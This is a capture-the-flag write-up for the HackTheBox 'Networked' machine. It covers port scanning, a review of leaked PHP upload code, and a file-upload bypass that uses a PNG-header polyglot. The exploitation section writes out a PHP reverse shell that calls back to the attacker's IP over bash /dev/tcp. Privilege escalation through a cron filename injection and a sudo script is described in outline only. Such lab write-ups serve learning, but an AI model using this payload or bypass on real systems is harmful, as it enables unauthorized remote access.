
# 🚩 Networked - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/1-banner.png)

## 📝 General Information
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Mode** | 🧭 Guided Mode |
| **Date** | 2026-04-28 |

---

## 🎯 Executive Summary
*On Networked, The breach is began with a MIME-type bypass using a crafted Polyglot PNG to crack open the web layer for an initial foothold. The momentum shifted to a stealthy horizontal pivot, weaponizing a Command Injection via a filename to hijack a vulnerable Cronjob and seize control of the user guly. The final strike was a clinical exploitation of a root-level bash script, where a misconfigured network variable was the key to shattering the system's last defense and claiming the ROOT throne! 🚩*

---

## 🛠️ Tools Used
`Your mind and eyes!!`, `Nmap`, `dirb`, `hexcurse`, `nc`

---

## 🔍 1: Reconnaissance & Enumeration

Attacker = 10.10.14.34

Target = 10.129.26.10

### 1.1 Port Scanning
```bash
sudo nmap -sS -p- -A -T4 10.129.26.10
```
🧐 Findings:

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 
```
> [!NOTE]
> 
> Which version of Apache is running on the target?
> 
> 2.4.6

### 1.2 Directory Brute-forcing
```bash
sudo nmap --script vuln -p80 10.129.26.10
dirb http://10.129.26.10
```
🧐 Findings:

```
PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 25 12:03:42 2026
URL_BASE: http://10.129.26.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.26.10/ ----
==> DIRECTORY: http://10.129.26.10/backup/                                                                         
+ http://10.129.26.10/cgi-bin/ (CODE:403|SIZE:210)                                                                 
+ http://10.129.26.10/index.php (CODE:200|SIZE:229)                                                                
==> DIRECTORY: http://10.129.26.10/uploads/ 
```
Cool, let's see each one


`/` > Normal welcoming web page.

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/2-web-page.png)
`/uploads/` > No thing interesting.

`/cgi-bin/` > Forbidden URL.

`/backup/` > Starting point !

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/3-backup.png)


> [!NOTE]
> 
> What is the relative path of the directory that contains the backup file on the webserver?
> 
> /backup

Now, I downloaded the `backup.tar` folder and extracted it, and found ***four files: index.php - lib.php - photos.php - upload.php*** written in PHP for the structure of this website. I examined them all, and here's what I found:

📑 `upload.php`

```PHP
foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```
* **Double Extension Bypass:** The code uses a whitelist of these extensions (.jpg, .png, .gif, .jpeg). However, the vulnerability lies in the fact that the code compares the filename's ending to the number of characters of allowed extensions like `.png`, allowing me to upload a file with a dual extension like `shell.php.png`

```PHP
$name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
```
* **File Naming:** The code changes the uploaded file name based on the IP address used (replacing dots with underscores). This helps me easily determine the final path of our malicious file.

```PHP
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
}

# Note: check_file_type fun was retrieved from a lib.php like this:

function check_file_type($file) {
  $mime_type = file_mime_type($file); 
  if (strpos($mime_type, 'image/') === 0) { 
      return true; 
  } else {
      return false;
  }  
}
```
* **MIME-Type Check:** The code relies on what the browser sends in the header (Content-Type) must be starting with `image/`. Since we can modify it with Burp Suite to `image/png`, while the file is PHP, the server is fooled... but it will NOT work alone because of `file_mime_type` function below..


📑 `lib.php`

```PHP
function file_mime_type($file) {
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME); 
    if (is_resource($finfo)) {
      $mime = @finfo_file($finfo, $file['tmp_name']); 
      finfo_close($finfo);
    }
  }
}
```
* **file_mime_type function:** This function uses the PHP library to verify that the file is indeed an image by looking only at the Magic Bytes (the first bytes of the file). Therefore now, I can place the PNG fingerprint at the beginning of my PHP file, and it will be allowed to pass through.


📑 `photos.php`

```PHP
foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;
  $files[$file] = filemtime($path. '/' . $file);
}
```
* **File display:** Locates the uploads folder and displays (executes/runs) the files.



🚀 Phase 2: Initial Access (Exploitation)
Vulnerability: [e.g., Insecure File Upload]
The source code revealed that it only checks for MIME Type and IP-based filenames.

Steps to Exploit:

Created a PNG polyglot file using printf.

Embedded a PHP reverse shell payload.

Named the file 10_10_14_34.php.png to bypass the regex check.

Bash
printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > 10_10_14_34.php.png
echo '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.34/9000 0>&1\""); ?>' >> 10_10_14_34.php.png
🛡️ Phase 3: Privilege Escalation
User: [Username]
Found a cronjob running a script named check_attack.php every 3 minutes.

Vulnerability: Command Injection via filename in exec() function.

Action: Created a file with a semicolon in its name to trigger the injection.

Root
Checked sudo permissions: sudo -l.

Binary: /usr/local/sbin/changename.sh

Exploit: Injected /bin/bash through the BOOTPROTO variable.

🏁 Conclusion & Mitigation
User Flag: ********************************

Root Flag: ********************************

Lessons Learned:
Always sanitize user input in system-level scripts.

Implement strict extension whitelisting for file uploads.

Created with 💜 by Reef
